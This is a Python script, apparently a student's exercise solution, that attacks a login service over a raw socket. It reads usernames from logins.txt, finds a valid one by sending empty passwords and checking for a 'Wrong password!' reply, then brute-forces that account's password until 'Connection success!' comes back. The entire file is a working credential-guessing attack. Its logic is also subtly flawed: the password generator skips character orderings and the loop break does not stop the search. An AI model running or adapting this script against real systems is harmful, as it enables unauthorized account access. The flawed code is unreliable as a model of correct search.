# write your code here
import sys
import socket
import itertools
import json

args = sys.argv


# hostname, port, message = args[1], int(args[2]), args[3]
# Collect arguments from command-line
hostname, port = args[1], int(args[2])


def socket_connect():
	new_socket = socket.socket()
	address = hostname, port
	new_socket.connect(address)
	return new_socket


def generate_alphanumeric_list():
	letters = list(map(lambda x: chr(x), list(range(ord('a'), ord('z') + 1))))
	numbers = list(map(lambda x: str(x), list(range(0, 10))))
	return letters + numbers


def send_message(sock, message):
	message = message.encode(encoding="utf-8")
	sock.send(message)


def generate_combinations(string):
	# length = len(string)
	# string += string.upper()
	# string = list(string)
	# for item in itertools.combinations(string, length):
	# 	yield "".join(item)
	string = string.lower()
	mx = 2 ** len(string)

	# Using all subsequences and permuting them
	for i in range(mx):
		combination = [k for k in string]
		for j in range(len(string)):
			if ((i >> j) & 1) == 1:
				combination[j] = string[j].upper()

		yield "".join(combination)


def main():
	passwords = []
	logins = []
	password_flag = False
	login_flag = False
	new_socket = socket_connect()
	alphanumeric = generate_alphanumeric_list()

	with open("logins.txt", "r") as login_file:
		logins = login_file.read().split("\n")

	# for login in logins:
	# 	for x in range(1, len(alphanumeric) + 1):
	# 		for item in itertools.combinations_with_replacement(alphanumeric, x):
	# 			password = "".join(item)
	#
	# 			message = {"login": login, "password": password}
	# 			json_message = json.dumps(message)
	# 			send_message(new_socket, json_message)
	# 			response = new_socket.recv(1024).decode()
	# 			json_response = json.loads(response)
	# 			if json_response["result"] == "Connection success!":
	# 				password_flag = True
	# 				print(json_message)
	# 				break
	# 			elif json_response["result"] == "Wrong Password!":
	# 				login_flag = True
	# 			elif json_response["result"] == "Wrong Login!":
	# 				break
	#
	# 		if password_flag:
	# 			break
	real_login = ""
	for login in logins:
		message = {"login": login, "password": ""}
		json_message = json.dumps(message, indent=4)
		send_message(new_socket, json_message)
		response = new_socket.recv(1024).decode()
		json_response = json.loads(response)
		if json_response["result"] == "Wrong password!":
			real_login = login
			break

	for x in range(1, 10):
		for item in itertools.combinations_with_replacement(alphanumeric, x):
			password = "".join(item)

			message = {"login": real_login, "password": password}
			json_message = json.dumps(message, indent=4)
			send_message(new_socket, json_message)
			response = new_socket.recv(1024).decode()
			json_response = json.loads(response)
			if json_response["result"] == "Connection success!":
				password_flag = True
				print(json_message)
				break

	new_socket.close()


main()

